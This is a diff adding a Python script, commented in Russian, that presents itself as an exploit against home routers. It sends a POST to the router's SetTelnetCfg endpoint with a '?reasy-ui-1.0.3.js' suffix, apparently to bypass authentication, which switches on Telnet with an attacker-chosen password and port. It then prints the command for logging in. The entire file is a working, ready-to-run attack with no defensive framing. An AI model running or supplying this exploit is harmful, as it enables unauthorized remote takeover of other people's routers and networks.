@@ -1,0 +1,76 @@
+import requests
+import sys
+from urllib.parse import urlparse
+import logging
+
+# Константы для значений по умолчанию
+DEFAULT_ROUTER_URL = "http://192.168.0.1"
+DEFAULT_PASSWORD = "password"
+DEFAULT_TELNET_PORT = "25"
+
+# Настройка логирования
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Выводит инструкцию по использованию скрипта
+def print_usage(script_name):
+    print(f"Использование: {script_name} URL_РОУТЕРА ПОРТ ПАРОЛЬ_ДЛЯ_УСТАНОВКИ")
+
+# Проверяет, является ли строка валидным URL
+def validate_url(url):
+    try:
+        result = urlparse(url)
+        return all([result.scheme, result.netloc])
+    except ValueError:
+        return False
+
+# Проверяет, является ли строка допустимым номером порта
+def validate_port(port):
+    return port.isdigit() and 0 < int(port) < 65536
+
+# Отправляет запрос для включения Telnet на целевом роутере
+def execute_exploit(router_url, telnet_port, password):
+    payload_url = f"{router_url}/goform/SetTelnetCfg?reasy-ui-1.0.3.js" # router_url - URL роутера
+    payload = {
+        "telnetEn": 1,
+        "telnetPwd": password, # password - Пароль для Telnet
+        "telnetPort": telnet_port # telnet_port - Порт Telnet
+    } # True, если эксплойт выполнен успешно | False, если произошла ошибка
+
+    try:
+        logging.info("Отправка запроса на %s", payload_url)
+        response = requests.post(payload_url, data=payload)
+        response_content = response.content.decode()
+        logging.info("Ответ сервера: %s", response_content)
+
+        return 'errCode":0' in response_content
+    except requests.RequestException as e:
+        logging.error("Ошибка при отправке запроса: %s", e)
+        return False
+
+def main():
+    if '-h' in sys.argv or '--help' in sys.argv:
+        print_usage(sys.argv[0])
+        sys.exit(0)
+
+    router_url = DEFAULT_ROUTER_URL
+    telnet_port = DEFAULT_TELNET_PORT
+    password = DEFAULT_PASSWORD
+
+    if len(sys.argv) > 3:
+        router_url, telnet_port, password = sys.argv[1:4]
+        
+        if not validate_url(router_url):
+            logging.error("Некорректный URL: %s", router_url)
+            sys.exit(1)
+        if not validate_port(telnet_port):
+            logging.error("Некорректный порт: %s", telnet_port)
+            sys.exit(1)
+
+    if execute_exploit(router_url, telnet_port, password):
+        logging.info("Подключитесь к роутеру, используя: `telnet %s %s` с паролем: %s",
+                     router_url.split('//')[1], telnet_port, password)
+    else:
+        logging.error("Произошла ошибка при выполнении эксплойта.")
+
+if __name__ == '__main__':
+    main()
